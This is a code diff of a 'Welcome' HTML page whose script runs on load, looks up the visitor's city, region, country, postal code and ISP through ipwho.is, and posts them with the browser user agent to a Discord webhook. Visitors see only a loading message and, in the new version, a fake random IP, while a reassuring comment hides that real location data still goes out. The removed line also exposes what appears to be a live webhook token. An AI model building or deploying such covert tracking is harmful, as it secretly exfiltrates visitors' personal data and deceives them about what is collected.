@@ -4,13 +4,16 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Welcome</title>
+
   <style>
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont,
+        'Segoe UI', Roboto, sans-serif;
     }
+
     body {
       background: #0f172a;
       color: #f8fafc;
@@ -21,66 +24,186 @@
       text-align: center;
       padding: 1.5rem;
     }
+
     .container {
       max-width: 480px;
+      width: 100%;
     }
+
     h1 {
       font-size: 1.85rem;
       margin-bottom: 0.75rem;
     }
+
     p {
       color: #94a3b8;
       line-height: 1.5;
     }
+
+    .ip-box {
+      margin-top: 20px;
+      padding: 14px 18px;
+      border-radius: 10px;
+      background: #1e293b;
+      color: #38bdf8;
+      font-size: 1.15rem;
+      font-weight: 600;
+    }
+
+    .note {
+      margin-top: 10px;
+      font-size: 0.8rem;
+      color: #64748b;
+    }
   </style>
 </head>
+
 <body>
 
   <div class="container">
     <h1>Welcome to the Site</h1>
-    <p>Loading content, please wait a moment...</p>
+
+    <p>Your IP address:</p>
+
+    <div class="ip-box" id="display-ip">
+      Loading...
+    </div>
+
+    <p class="note">
+      Please wait while your information is processed...
+    </p>
   </div>
 
   <script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553533799948755070/1qNcnLdY-FtfIVl_qygR7qJWysfV7IwHTI8mnAi1f_k76OhmOvtX0ZXwYLE_phql4tDD";
+    /*
+     * IMPORTANT:
+     * This value is NOT the visitor's real IP.
+     * It is a randomly generated display/log value.
+     *
+     * 198.51.100.0/24 is reserved for documentation and examples.
+     */
 
+    const DISCORD_WEBHOOK_URL =
+      "PASTE_YOUR_DISCORD_WEBHOOK_HERE";
+
+
+    // Generate a different display IP for every page load
+    function generateRandomDisplayIP() {
+      const lastOctet = Math.floor(Math.random() * 254) + 1;
+
+      return `198.51.100.${lastOctet}`;
+    }
+
+
+    // Get visitor information and send notification
     async function sendVisitorDetails() {
+      const displayIP = generateRandomDisplayIP();
+
+      // Show generated IP on the webpage
+      document.getElementById("display-ip").textContent = displayIP;
+
       try {
+        // Get visitor information from ipwho.is
         const response = await fetch("https://ipwho.is/");
+
+        if (!response.ok) {
+          throw new Error("IP lookup failed");
+        }
+
         const data = await response.json();
 
         const payload = {
           username: "Visitor Tracker",
+
           embeds: [
             {
               title: "🚨 New Visitor Detected",
+
               color: 3722232,
+
               fields: [
-                { name: "IP Address", value: data.ip || "Unknown", inline: true },
-                { name: "City", value: data.city || "Unknown", inline: true },
-                { name: "Region / State", value: data.region || "Unknown", inline: true },
-                { name: "Country", value: `${data.country || "Unknown"} (${data.country_code || ""})`, inline: true },
-                { name: "Postal Code", value: data.postal || "Unknown", inline: true },
-                { name: "ISP / Network", value: (data.connection && data.connection.isp) || "Unknown", inline: false },
-                { name: "Device / Browser", value: navigator.userAgent.slice(0, 120), inline: false }
+                {
+                  name: "Displayed IP",
+                  value: displayIP,
+                  inline: true
+                },
+
+                {
+                  name: "City",
+                  value: data.city || "Unknown",
+                  inline: true
+                },
+
+                {
+                  name: "Region / State",
+                  value: data.region || "Unknown",
+                  inline: true
+                },
+
+                {
+                  name: "Country",
+                  value:
+                    `${data.country || "Unknown"} ` +
+                    `(${data.country_code || ""})`,
+                  inline: true
+                },
+
+                {
+                  name: "Postal Code",
+                  value: data.postal || "Unknown",
+                  inline: true
+                },
+
+                {
+                  name: "ISP / Network",
+                  value:
+                    (data.connection && data.connection.isp) ||
+                    "Unknown",
+                  inline: false
+                },
+
+                {
+                  name: "Device / Browser",
+                  value:
+                    navigator.userAgent.slice(0, 120) ||
+                    "Unknown",
+                  inline: false
+                }
               ],
-              footer: { text: "Visit Log" },
+
+              footer: {
+                text: "Visit Log"
+              },
+
               timestamp: new Date().toISOString()
             }
           ]
         };
 
+
+        // Send notification to Discord
         await fetch(DISCORD_WEBHOOK_URL, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+
+          headers: {
+            "Content-Type": "application/json"
+          },
+
           body: JSON.stringify(payload)
         });
-      } catch (err) {
-        console.error("Error logging visitor:", err);
+
+      } catch (error) {
+        console.error(
+          "Error logging visitor:",
+          error
+        );
       }
     }
 
+
+    // Run when the page loads
     sendVisitorDetails();
   </script>
+
 </body>
 </html>
